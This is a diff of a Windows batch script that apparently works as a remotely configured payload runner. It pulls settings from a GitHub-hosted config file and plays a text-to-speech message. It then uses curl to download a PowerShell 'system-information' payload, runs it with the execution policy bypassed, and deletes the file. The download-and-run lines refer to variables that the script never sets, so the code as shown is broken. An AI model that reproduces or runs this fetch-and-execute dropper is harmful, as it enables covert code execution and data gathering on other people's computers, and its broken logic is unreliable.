@@ -1,13 +1,9 @@
 @echo off
 setlocal enabledelayedexpansion
+:: Default color :: color 0F :: Set Console Window Properties :: mode con: cols=80 lines=25
 
-:: Default color
-:: color 0F
-:: Set Console Window Properties
-:: mode con: cols=80 lines=25
-
-:: Set the URL of the configuration file on GitHub
-set "configUrl=https://raw.githubusercontent.com/AROA-DEV/Reaper/main/Config/Reaper-config.cfg"
+:: Set the URL of the configuration file on GitHub, these is set to a default there is an empty template to in [https://github.com/raf181/Script-Payload/blob/main/Project%201/Config/Remote/empty-config.cfg]
+set "configUrl=https://github.com/raf181/Script-Payload/blob/main/Project%201/Config/Remote/config.cfg" 
 set "config_local=Local-Config.cfg"
 :: Set local path for "antidote" codes
 set "local_antidote=%USERPROFILE%\OneDrive\Documentos\reaper_antidote_codes.cfg"
@@ -32,7 +28,6 @@ for /f "delims=" %%i in ('curl -s "%configUrl%"') do (
         )
     )
 )
-
 :: Process based on fetched configuration
 if defined available_remote_config (
     if defined active_status (
@@ -62,26 +57,91 @@ if defined available_remote_config (
 )
 
 :Active
+:: Get variables
 for /f "usebackq tokens=1* delims== " %%a in (`%config_file%`) do (
-    if /i "%%a"=="SERVER_DSERVER_REMOTE" (
-        set "server_dserver_remote=%%b"
-    ) else if /i "%%a"=="SERVER_DSERVER_REMOTE_PORT" (
-        set "server_dserver_remote_port=%%b"
+    
+    if /i "%%a"=="TEXT_TO_SPEECH_ENABLED" (    
+        :: text to speach
+        set "text_to_speech_enabled=%%b"
+    ) else if /i "%%a"=="TEXT_TO_SPEECH" (
+        set "text_to_speech=%%b"
+    ) else if /i "%%a"=="SCRIPT_INFR_ENABLED" (
+        :: info reatrive
+        set "script_infr_enabled=%%b"
+    ) else if /i "%%a"=="SCRIPT_INFR_L" (
+        :: info reatrive
+        set "script_infr_l=%%b"
+    ) else if /i "%%a"=="SCRIPT_INFR_N" (
+        set "script_infr_n=%%b"
     )
 )
 
 :: Validate if all the required variables are set
-if not defined server_dserver_remote (
-    echo Required variable 'server_dserver_remote' is not set.
+:: text to speach enabled?
+if not defined text_to_speech_enabled (
+    set "text_to_speech_enabled=true"
+    echo text to speach not defined to true/false
     pause
-    exit /b 1
+)
+:: text to speach text?
+if not defined text_to_speech (
+    set "text_to_speech=No text to speech configured"
+    echo No text to speech configured
+    pause
+)
+:: info reatrive script enabled true/false
+if not defined script_infr_enabled (
+    set "script_infr_enabled=true"
+    echo Info retreave is not defined to run [true/false]
+    pause
+)
+:: info reatrive script link
+if not defined script_infr_l (
+    set "script_infr_l=https://raw.githubusercontent.com/raf181/Script-Payload/blob/main/Project%201/Payloads/system-information.ps1"
+    echo no link is set retreaving the default script from [raf181/Script-Payload]
+    pause
+)
+:: info reatrive name 
+if not defined script_infr_n (
+    set "script_infr_n=payload"
+    pause
 )
 
-if not defined server_dserver_remote_port (
-    echo Required variable 'server_dserver_remote_port' is not set.
-    pause
-    exit /b 1
-)
+:: Script starts here ======================================================================================================= ::
+:: ================================== ::
+:: Custom payload: 
+:: # Text to speech
+:: # System information.ps1
+::
+::
+:: ================================== ::
 
-echo Configuration processed successfully.
+:: Text to speech payload =================================================================================================== ::
+if /i "%text_to_speech_enabled%"=="true" (
+    set "volumeLevel=100"
+    :: Save VBScript code to a temporary file
+    set "vbsScriptFile=%temp%\TextToSpeech.vbs"
+    (
+        echo Set speech = Wscript.CreateObject^("SAPI.SpVoice"^)
+        echo speech.Volume = %volumeLevel%
+        echo speech.Speak "%text_to_speech%"
+    ) > "%vbsScriptFile%"
+    :: Run the VBScript
+    cscript //nologo "%vbsScriptFile%"
+    :: Clean up the temporary VBScript file
+    del "%vbsScriptFile%"
+)
+:: End of text to speech payload ============================================================================================== ::
+
+:: Info reatrive payload ====================================================================================================== ::
+:: Download the PowerShell script
+curl -o "%ScriptName%" "%ScriptURL%"
+:: Run the downloaded PowerShell script
+PowerShell.exe -ExecutionPolicy Bypass -File "%ScriptName%"
+:: Delete the downloaded PowerShell script
+del "%ScriptName%"
+:: Info reatrive payload end ================================================================================================== ::
+
+:: Script ends here =========================================================================================================== ::
+echo Script processed successfully.
 pause
